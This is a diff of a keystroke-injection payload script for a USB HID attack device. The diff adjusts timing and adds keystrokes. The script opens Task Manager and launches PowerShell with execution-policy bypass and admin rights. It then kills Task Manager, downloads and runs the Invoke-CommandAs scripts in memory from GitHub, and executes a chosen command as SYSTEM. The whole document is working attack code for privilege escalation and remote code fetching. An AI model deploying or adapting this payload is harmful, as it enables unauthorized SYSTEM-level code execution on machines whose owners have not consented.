@@ -7,20 +7,24 @@ REM --> Variable is the thing you want to run as system. (Defaults to whoami for
 DEFINE COMMAND_AS_SYSTEM whoami
 DELAY 1000
 GUI x
-DELAY 100
+DELAY 500
 STRING t
-DELAY 300
-ALT f
+DELAY 500
+LEFT
 DELAY 100
+ENTER
+DELAY 500
+ALT f
+DELAY 500
 n
 DELAY 1000
 STRING powershell -ep bypass
 TAB
-DELAY 300
+DELAY 500
 SPACE
-DELAY 300
+DELAY 500
 ENTER
-DELAY 300
+DELAY 500
 STRING taskkill /IM taskmgr.exe ; "Public/Invoke-CommandAs.ps1", "Private/Invoke-ScheduledTask.ps1" | % { . ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman\/Invoke-CommandAs/master/Invoke-CommandAs/${_}")))} ; Invoke-CommandAs -ScriptBlock { COMMAND_AS_SYSTEM } -AsSystem
 ENTER
 CAPSLOCK
